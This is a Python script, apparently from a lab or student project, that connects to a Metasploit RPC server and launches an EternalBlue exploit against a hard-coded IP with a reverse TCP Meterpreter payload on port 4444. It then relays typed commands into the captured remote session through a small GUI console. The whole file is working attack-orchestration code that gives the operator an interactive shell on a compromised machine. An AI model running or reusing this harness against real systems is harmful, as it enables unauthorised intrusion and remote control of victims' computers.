import asyncio
import sys
import threading
from typing import Callable

import pymetasploit3.msfrpc
from pymetasploit3.msfrpc import MsfRpcClient, MeterpreterSession

from src.libs.GUI import GUI
from src.libs.Logger import Logger
from src.libs.modules.Eternalblue import Eternalblue
from src.libs.modules.list.Payload_List import REVERSE_TCP

client: MsfRpcClient = None
logger = Logger('Main')
gui = GUI('My Console')
stop_funcs: list[Callable] = []
shell: MeterpreterSession


@gui.event
def on_input_line(gui: GUI, text: str):
    args = text.split()

    if args[0].lower() == 'exit':
        if '-y' in args:
            shutdown()

    # TODO: 多分頁區分 session
    # 若無 client 定義、連線
    if not client:
        gui.println('請等待 RPC 連線成功再輸入指令')
        return

    # 若無 Session
    if len(client.sessions.list) == 0:
        gui.println('目前無可用的 session 連線')
        gui.println('輸入 exit -y 結束程式')
        return

    # 顯示輸入內容
    gui.println(f'$ {text}')
    global shell
    # 傳送指令
    shell.write(text)


def connect_rpc():
    try:
        logger.info('正在連線到 RPC...')
        global client
        client = MsfRpcClient("salt", port=55553, ssl=True)
        logger.succ('成功連線到 RPC')
    except pymetasploit3.msfrpc.MsfAuthError:
        logger.err('驗證失敗，無法連線到 RPC')
        sys.exit(1)
    except:
        logger.err('請檢查 RPC 是否已經開啟')
        sys.exit(1)


async def eternalblue() -> Eternalblue:
    eternal_blue = Eternalblue(client, '172.20.10.4', REVERSE_TCP, LPORT=4444)
    stop_funcs.append(eternal_blue.stop)

    @eternal_blue.event
    def on_read(text):
        gui.println(text)

    @eternal_blue.event
    def on_session_created(session_id):
        global shell
        shell = client.sessions.session(session_id)

    return eternal_blue


async def attack():
    """
    異步攻擊線程
    """

    # 初始化攻擊
    eternal_blue = await eternalblue()

    await asyncio.gather(
        eternal_blue.run(),
    )


def shutdown():
    logger.info('正在關閉...')
    for func in stop_funcs:
        func()
    attack_thread.join()
    if client:
        client.logout()
    logger.succ('關閉完成')
    exit(0)


if __name__ == "__main__":
    # 建立客戶端
    connect_rpc()

    attack_thread = threading.Thread(target=lambda: asyncio.run(attack()))
    attack_thread.start()

    gui.println('輸入 exit -y 結束程式')
    gui.build()
    shutdown()
